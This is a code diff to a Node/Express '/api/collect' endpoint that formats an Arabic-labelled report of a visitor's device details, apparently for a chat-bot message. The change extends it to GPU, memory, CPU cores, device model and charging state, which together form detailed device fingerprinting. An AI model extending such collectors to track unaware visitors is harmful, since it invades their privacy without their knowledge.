@@ -169,13 +169,17 @@ app.post('/api/collect', async (req, res) => {
 
     if (data.device) {
         message += `\n📱 <b>معلومات الجهاز:</b>\n`;
-        message += `   💻 النظام: ${data.device.platform || 'غير معروف'}\n`;
-        message += `   🌐 المتصفح: ${data.device.browser || 'غير معروف'}\n`;
+        if (data.device.model) message += `   📲 الطراز: ${data.device.model}\n`;
+        message += `   🖥️ النوع: ${data.device.type || (data.device.isMobile ? 'موبايل' : 'كمبيوتر')}\n`;
+        message += `   💻 النظام: ${data.device.platform || data.device.os || 'غير معروف'}\n`;
+        message += `   🌐 المتصفح: ${data.device.browserFull || data.device.browser || 'غير معروف'}\n`;
         message += `   📐 الشاشة: ${data.device.screenWidth}x${data.device.screenHeight}\n`;
+        if (data.device.memory && data.device.memory !== 'Unknown') message += `   🧠 الذاكرة: ${data.device.memory}\n`;
+        if (data.device.cores && data.device.cores !== 'Unknown') message += `   ⚙️ المعالج: ${data.device.cores} أنوية\n`;
+        if (data.device.gpu) message += `   🎮 GPU: ${data.device.gpu}\n`;
         message += `   🗣️ اللغة: ${data.device.language || 'غير معروف'}\n`;
         message += `   📶 الاتصال: ${data.device.connection || 'غير معروف'}\n`;
-        message += `   🔋 البطارية: ${data.device.battery || 'غير معروف'}\n`;
-        message += `   📱 الجهاز: ${data.device.isMobile ? 'موبايل' : 'كمبيوتر'}\n`;
+        message += `   🔋 البطارية: ${data.device.battery || 'غير معروف'}${data.device.charging === 'نعم' ? ' ⚡ يشحن' : ''}\n`;
     }
 
     message += `━━━━━━━━━━━━━━━━━━`;
